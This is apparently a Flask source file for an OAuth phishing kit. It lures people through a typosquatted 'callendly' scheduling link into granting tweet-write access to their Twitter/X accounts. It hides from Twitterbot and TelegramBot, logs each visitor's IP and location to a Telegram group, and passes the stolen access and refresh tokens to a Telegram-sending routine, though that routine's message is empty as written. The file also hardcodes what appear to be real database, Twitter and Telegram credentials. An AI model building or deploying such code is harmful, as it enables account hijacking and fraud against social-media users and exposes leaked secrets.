from flask import Flask, request, redirect
import requests
import base64
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi

app = Flask(__name__)

MONGO_URI = "mongodb+srv://advonisx:TRYsyrGie4c0uVEw@cluster0.qtpxk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&ssl=true"

TWITTER_CLIENT_ID = 'eWNUdkx4LTlnaGQ0N3BaSGJyYkU6MTpjaQ' # Replace with your Twitter client ID
TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn' # Replace with your Twitter client secret

TELEGRAM_BOT_TOKEN = '6478716007:AAG8C9T5bT96SHV2te7OspEeRGiwzwPobGE' # Replace with your Telegram bot token

credentials = f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}"
credentials_base64 = base64.b64encode(credentials.encode()).decode('utf-8')

client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
db = client['cobra_db']
groups = db['groups']

parse_mode = "MarkDown"

try:
    client.admin.command('ping')
    print("[+] MongoDB has successfully connected.")
except Exception as e:
    print("[-] MongoDB has failed connecting.")
    print(e)

@app.route('/oauth') # Examples: cointelegraph, decryptmedia, etc
def index():
    user_agent = request.headers.get('User-Agent')

    if user_agent is None:
        user_agent = ''

    user_agent = user_agent.strip('\r\n')
    
    identifier = request.args.get('identifier')
    if not identifier:
        return "⚠️ Identifier is required.", 400
        
    group = groups.find_one({"identifier": identifier})
    if not group:
        return "⚠️ Group not found.", 404
        
    redirect = group.get('redirect')
    group_id = group.get('group_id')

    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
        return redirect('https://calendly.com/cointele')
    else:
        if 'X-Forwarded-For' in request.headers:
            real_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
        else:
            real_ip = request.remote_add

        res = requests.get(f'http://ip-api.com/json/{real_ip}')
        data = res.json()

        country = data["country"]
        country_code = data["countryCode"]
        city = data["city"]

        code_points = [ord(char) + 127397 for char in country_code]
        country_flag = ''.join(chr(code_point) for code_point in code_points)

        message = f'🔗 Connection: {real_ip}\n\n{country_flag} {city}, {country}'

        requests.post(
            f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
            data={
                'chat_id': group_id,
                'text': message
            }
        )

        TWITTER_CALLBACK_URL = 'https://callendly.pythonanywhere.com/auth' # Example: /auth, /callback, /authorize
        twitter_oauth_url = f'https://twitter.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}&redirect_uri={TWITTER_CALLBACK_URL}&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write&state=state&code_challenge=challenge&code_challenge_method=plain'
        return redirect(twitter_oauth_url)


@app.route('/auth') # Examples: auth, callback, authorize
def callback():
    authorization_code = request.args.get('code')

    token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
    user_lookup_url = 'https://api.twitter.com/2/users/me'

    request_data = {
        'grant_type': 'authorization_code',
        'code': authorization_code,
        'redirect_uri': 'https://callendly.pythonanywhere.com/auth', # Example: https://your-name.pythonanywhere.com/your-redirect
        'code_verifier': "challenge"
    }

    headers = {
        'Authorization': f'Basic {credentials_base64}',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    response = requests.post(token_exchange_url,
                             data=request_data,
                             headers=headers)
    response_data = response.json()
    print(response_data)

    access_token = response_data['access_token']
    refresh_token = response_data['refresh_token']

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
    }

    response = requests.get(user_lookup_url,
                             headers=headers)
    response_data = response.json()

    username = response_data['data']['username']

    send_to_telegram(username, access_token, refresh_token, TELEGRAM_GROUP_CHAT_ID)

    return redirect("https://calendly.com/cointele/45min?back=1&month=2024-08", code=302)

def send_to_telegram(username: str, access_token: str, refresh_token: str, group_id) -> None:
    message: str = f''

    requests.post(
        f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
        data={
            'chat_id': group_id,
            'text': message,
            'parse_mode': 'MarkDown'
        })

if __name__ == '__main__':
  app.run()
